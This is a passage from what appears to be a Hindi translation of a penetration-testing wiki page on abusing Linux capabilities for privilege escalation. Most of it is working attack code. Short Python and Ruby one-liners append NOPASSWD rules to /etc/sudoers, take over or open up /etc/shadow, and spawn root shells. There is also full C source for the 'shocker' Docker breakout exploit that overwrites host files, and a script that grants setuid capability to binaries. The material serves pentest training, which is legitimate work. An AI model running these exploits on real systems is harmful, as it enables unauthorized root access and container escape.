**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§∞ ‡§≤‡§ø‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§**

‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§∞‡•Ä ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§π‡•à‡§Ç ‡§ú‡§ø‡§® ‡§™‡§∞ ‡§Ü‡§™ **‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§â‡§®‡•ç‡§®‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç,** [**‡§Ø‡§π‡§æ‡§Ç ‡§∏‡•á ‡§Ü‡§™ ‡§µ‡§ø‡§ö‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç vim ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ü‡§™ _passwd_, _sudoers_ ‡§Ø‡§æ _shadow_ ‡§ú‡•à‡§∏‡•Ä ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§•**

‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç **`python`** ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä‡•§ ‡§Ü‡§™ ‡§™‡§æ‡§Ø‡§•‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§° ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• + CAP_DAC_READ_SEARCH (Docker ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü)**

‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
‡§∏‡§¨‡§∏‡•á ‡§™‡§π‡§≤‡•á, ‡§π‡•ã‡§∏‡•ç‡§ü ‡§ï‡•Ä [**DAC\_READ\_SEARCH ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§®‡§ø‡§Ø‡§Æ‡§ø‡§§ ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§™‡§¢‡§º‡§®‡•á**](linux-capabilities.md#cap\_dac\_read\_search) ‡§ï‡•á ‡§™‡§ø‡§õ‡§≤‡•á ‡§ñ‡§Ç‡§° ‡§ï‡•ã ‡§™‡§¢‡§º‡•á‡§Ç ‡§î‡§∞ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡•ã **‡§ï‡§Ç‡§™‡§æ‡§á‡§≤** ‡§ï‡§∞‡•á‡§Ç‡•§
‡§´‡§ø‡§∞, ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∂‡•â‡§ï‡§∞ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡§æ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ **‡§ï‡§Ç‡§™‡§æ‡§á‡§≤ ‡§ï‡§∞‡•á‡§Ç**, ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§π‡•ã‡§∏‡•ç‡§ü ‡§ï‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§Æ‡•á‡§Ç **‡§Ö‡§®‡§ø‡§Ø‡§Æ‡§ø‡§§ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ó‡§æ:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§∏‡•á ‡§´‡§º‡§æ‡§á‡§≤ `/etc/shadow` ‡§î‡§∞ `/etc/passwd` ‡§ï‡•ã **‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§°** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§®‡§Ø‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ** ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ ‡§â‡§®‡•ç‡§π‡•á‡§Ç **`shocker_write`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§ß‡§ø‡§≤‡•á‡§ñ‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§´‡§ø‡§∞, **ssh** ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á **‡§™‡§π‡•Å‡§Ç‡§ö** ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§ï‡•ã‡§° "Abusing DAC\_OVERRIDE Capability" ‡§ï‡•á ‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡§∂‡§æ‡§≤‡§æ ‡§∏‡•á ‡§ï‡•â‡§™‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•á ‡§∏‡•ç‡§µ‡§æ‡§Æ‡§ø‡§§‡•ç‡§µ ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Æ‡§æ‡§® ‡§≤‡•á‡§Ç ‡§ï‡§ø **`python`** ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à, ‡§Ü‡§™ **shadow** ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•á **‡§∏‡•ç‡§µ‡§æ‡§Æ‡•Ä** ‡§ï‡•ã **‡§¨‡§¶‡§≤** ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, **‡§∞‡•Ç‡§ü ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¨‡§¶‡§≤** ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§â‡§®‡•ç‡§®‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
‡§Ø‡§æ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• **`ruby`** ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Ø‡§¶‡§ø ‡§™‡§æ‡§Ø‡§•‡§® ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ ‡§∂‡•à‡§°‡•ã ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, **‡§∞‡•Ç‡§ü ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§î‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§®‡§è ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§Ü‡§à‡§°‡•Ä ‡§ï‡•ã ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Ø‡§¶‡§ø ‡§™‡§æ‡§Ø‡§•‡§® ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡§π **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ** ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á ‡§á‡§∏‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§∞‡•Ç‡§ü ‡§§‡§ï ‡§â‡§®‡•ç‡§®‡§Ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**‡§è‡§ï ‡§î‡§∞ ‡§§‡§∞‡•Ä‡§ï‡§æ:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§®‡§è ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§∏‡§Æ‡•Ç‡§π ‡§Ü‡§à‡§°‡•Ä ‡§ï‡•ã ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§**

‡§Ø‡§π‡§æ‡§Ç ‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§∞‡•Ä ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§Ü‡§™ **‡§â‡§ö‡•ç‡§ö‡§§‡§Æ ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ß‡§ø‡§≤‡•á‡§ñ‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç,** [**‡§Ü‡§™ ‡§Ø‡§π‡§æ‡§Ç ‡§∏‡•á ‡§µ‡§ø‡§ö‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)‡•§

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, ‡§Ü‡§™‡§ï‡•ã ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§ï‡§ø ‡§ï‡•å‡§® ‡§∏‡•Ä ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§è‡§ï ‡§∏‡§Æ‡•Ç‡§π ‡§™‡§¢‡§º ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§ï‡§∞‡§£ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
‡§è‡§ï ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§Ü‡§™ ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§ñ‡•ã‡§ú ‡§≤‡•á‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™ ‡§â‡§ö‡•ç‡§ö‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§™‡§¢‡§º‡§®‡•á ‡§Ø‡§æ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á), ‡§§‡•ã ‡§Ü‡§™ **‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§ï‡§∞‡§£ ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è ‡§è‡§ï ‡§∂‡•á‡§≤ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡•Ç‡§π shadow ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§ï‡§∞‡§£ ‡§ï‡•Ä ‡§ó‡§à ‡§•‡•Ä, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ü‡§™ `/etc/shadow` ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§™‡§¢‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
cat /etc/shadow
```
‡§Ø‡§¶‡§ø **docker** ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ **docker ‡§∏‡§Æ‡•Ç‡§π** ‡§ï‡§æ **‡§Ö‡§®‡•Å‡§ï‡§∞‡§£** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§á‡§∏‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á [**docker ‡§∏‡•â‡§ï‡•á‡§ü** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§µ‡§æ‡§¶ ‡§ï‡§∞‡§ï‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç](./#writable-docker-socket).

## CAP\_SETFCAP

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§™‡§∞ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Å ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Ø‡§¶‡§ø python ‡§Æ‡•á‡§Ç ‡§Ø‡§π **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ** ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á ‡§á‡§∏‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§∞‡•Ç‡§ü ‡§§‡§ï ‡§¨‡§¢‡§º‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§Ü‡§™ CAP\_SETFCAP ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§®‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§ñ‡•ã ‡§¶‡•á‡§Ç‡§ó‡•á‡•§
{% endhint %}

